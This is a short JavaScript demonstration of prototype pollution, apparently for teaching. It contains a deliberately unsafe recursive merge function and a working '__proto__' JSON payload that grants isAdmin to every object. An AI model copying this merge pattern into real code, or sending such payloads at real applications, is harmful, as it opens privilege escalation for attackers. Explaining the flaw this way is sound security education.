// A simple recursive merge function
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Attacker sends a malicious JSON payload
const maliciousPayload = JSON.parse('{"__proto__": {"isAdmin": true}}');
let userSession = {};

merge(userSession, maliciousPayload);

// The payload pollutes the global Object prototype
const standardUser = {};
console.log(standardUser.isAdmin); // Outputs: true (The attacker just made everyone an admin!)
